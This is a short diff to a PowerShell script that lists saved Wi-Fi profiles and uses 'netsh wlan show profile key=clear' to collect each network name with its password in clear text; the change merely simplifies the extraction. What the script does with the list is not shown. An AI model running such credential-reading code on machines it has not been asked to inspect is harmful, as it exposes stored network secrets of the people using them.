@@ -16,11 +16,8 @@ $passwordList = @()
 Write-Host "Getting list Wifi Passwords..."
 foreach ($profile in $wifiProfiles) {
     $profileInfo = netsh wlan show profile name="$profile" key=clear
-    $passwordLine = $profileInfo | Select-String -Pattern "Key Content"
-    if ($passwordLine) {
-        $password = $passwordLine | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-        $passwordList += "${profile}:${password}"
-    }
+    $password = $profileInfo | Select-String -Pattern "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+    $passwordList += "${profile}:${password}"
 }
 
 if ($passwordList) {
